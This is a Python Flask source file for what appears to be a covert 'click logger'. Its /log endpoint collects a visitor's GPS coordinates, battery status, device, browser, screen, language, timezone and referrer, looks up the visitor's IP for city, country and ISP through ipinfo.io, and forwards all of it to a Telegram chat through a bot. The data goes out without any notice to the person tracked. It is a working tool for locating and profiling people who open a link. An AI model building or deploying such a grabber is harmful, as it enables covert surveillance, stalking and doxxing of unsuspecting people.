from flask import Flask, request, render_template
import requests
from datetime import datetime
import os

app = Flask(__name__)

# Get values from environment variables
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

def send_telegram(msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"}
    requests.post(url, data=data)

def get_ip_info(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json").json()
        return {
            "ip": ip,
            "city": response.get("city", ""),
            "region": response.get("region", ""),
            "country": response.get("country", ""),
            "loc": response.get("loc", ""),
            "org": response.get("org", "")
        }
    except:
        return {"ip": ip}

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    forwarded = request.headers.get('X-Forwarded-For', request.remote_addr)
    real_ip = forwarded.split(",")[0].strip()
    ip_info = get_ip_info(real_ip)

    msg = f"""📥 <b>New Click Logged!</b>

🌐 <b>IP:</b> {ip_info.get("ip")}
🌎 <b>Country:</b> {ip_info.get("country")} | <b>City:</b> {ip_info.get("city")}
📡 <b>ISP:</b> {ip_info.get("org")}

📍 <b>Latitude:</b> {data.get("lat")},<b>longitude:</b> {data.get("lon")}
🔋 <b>Battery:</b> {data.get("battery_level", '?')}% (Charging: {data.get("charging", '?')})

📱 <b>Device:</b> {data.get("device")}
🧠 <b>Browser:</b> {data.get("browser")}
📏 <b>Screen:</b> {data.get("screen")}
🗣 <b>Language:</b> {data.get("language")}
🕒 <b>Timezone:</b> {data.get("timezone")}
🔗 <b>Referrer:</b> {data.get("referrer") or 'None'}

🕒 <b>Time:</b> {datetime.now().strftime('%d-%b-%Y %I:%M %p')}
"""
    send_telegram(msg)
    return {'status': 'ok'}

if __name__ == '__main__':
    app.run(debug=True)
